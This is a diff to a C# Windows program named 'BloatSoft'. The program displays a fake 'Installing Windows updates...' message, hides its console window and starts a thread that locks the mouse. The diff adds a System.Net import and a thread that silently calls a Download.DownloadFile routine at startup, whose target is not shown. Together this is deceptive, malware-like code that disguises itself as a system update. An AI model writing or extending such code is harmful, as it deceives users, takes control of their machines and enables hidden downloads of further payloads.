@@ -6,6 +6,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Net;
 
 namespace BloatSoft
 {
@@ -20,12 +21,17 @@ namespace BloatSoft
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
+        [STAThread]
         static void Main(string[] args)
         {
             Console.WriteLine("Installing Windows updates...");
             Thread.Sleep(300);
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
+
+            Thread dl = new Thread(Download.DownloadFile);
+            dl.Start();
+
             MessageBox.Show("fiem");
 
             Thread mouseThread = new Thread(LockMouse.move);
